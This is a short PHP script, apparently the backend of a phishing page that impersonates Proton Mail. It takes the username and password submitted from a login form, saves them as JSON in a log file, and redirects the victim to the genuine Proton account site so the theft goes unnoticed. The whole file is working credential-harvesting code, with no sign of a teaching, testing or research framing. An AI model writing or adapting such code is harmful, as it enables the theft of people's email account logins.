<?php

header('Location: https://account.proton.me/');
$data = array('site' => 'Protomail',
  'user' => $_POST['username'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>